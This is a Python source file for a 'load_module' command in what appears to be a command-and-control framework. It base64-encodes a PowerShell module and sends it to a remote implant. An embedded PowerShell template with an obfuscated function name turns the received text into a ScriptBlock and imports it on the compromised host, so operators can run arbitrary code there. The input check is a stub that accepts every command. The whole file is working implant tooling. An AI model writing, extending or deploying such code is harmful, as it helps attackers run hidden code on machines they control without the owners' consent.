import os
import base64


class LoadModule:
    type = "LM"
    args = "name of powershell module on server"
    input = "load_module"
    # this must be unique across ALL implants, any matching keys will be merged causing errors.
    # To safely format this use the following format "<type>_variablename":"value" i.e.
    #   fd_base64_var: base64filecontents
    obfuscation_keypairs = {}

    def process_implant_response(self,data, args):
        return f"Load module:\n{data.decode()}", None

    def implant_text(self):
        var = '''
function {{ ron.obf_load_module }} ($data) {
    $b = $data
    $data = $b -split '::', 2
    $name = $data[0].Replace(" ","")
    $bgt = $data[1]
    $b = [ScriptBlock]::Create($bgt)
    New-Module -ScriptBlock $b -Name $name -Verbose | Import-Module
    $global:tr = Get-Command -Module $name -Verbose
}'''
        return var

    def pre_process_command(self, argument_string):
        # Check if the argument to be passed to the implant is valid.
        # I.e.
        #    Does the file to be uploaded exist local?
        #    Is the command to be executed dangerous?
        return True


    def create_module_data_string(self, cmd_entry):
        # This function is responsible for creating the string which is send to the implant
        # Format for the implant core string is:
        #   < command type > <command id><optional command arguments>
        try:
            with open(str(os.getcwd() + "/Storage/implant_resources/modules/" + cmd_entry['args'] + ".ps1"),
                      'r') as fileh:
                to_encode = f"{cmd_entry['args']}::{fileh.read()}"
                load_module_string = f"{base64.b64encode(to_encode.encode()).decode()}"
                return load_module_string
        except Exception as e:

            # These exceptions should be added to a log file.
            print(f"Load module failed: {e}")
            pass
